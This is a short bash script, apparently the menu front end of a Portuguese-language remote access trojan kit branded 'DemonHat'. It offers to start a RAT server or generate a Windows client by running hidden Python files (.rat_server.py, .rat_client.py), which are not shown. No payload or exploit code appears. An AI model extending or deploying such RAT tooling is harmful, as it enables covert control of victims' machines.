#!/bin/bash

rat(){
  green='\e[32m'
  red='\e[31m'
  yelow='\e[33m'
  echo -e "${green}
 ____:(    _  _____ _   ___  
1  _ D    E C|_   _1 ! 7 _ 9 
1 |_) 1  M _ O 1 1 1 11 1 1 |
1  _ <  O ___ NH E C |M E_N O
1_1 7_1N_H   A_T_| |_(_)___7 
====@DEMONHAT..... ==========

[Criador] @DemonHAt
[Instagram] https://www.instagram.com/demon.hat
[:)] O codigo e como um espelho, porque reflete a mente do programador.
[*] Realmente esta e a primeira versao do RAT somente pode gerar Ferramentas para windows
[*] Aguardem a versao 1.1 que trarei versoes para apk.


[01] Servidor      [02] Gerar_cliente ${reset}

  "

  read -p "┌──(creator㉿DemonHat)-[THEHACK/RAT] " comando

  if [ "$comando" = "1" ]; then
    python3 .rat_server.py

  elif [ "$comando" = "2" ]; then
    python3 .rat_client.py
  else
    echo "[ERROR]  Comando nao encontrado"

  fi
}
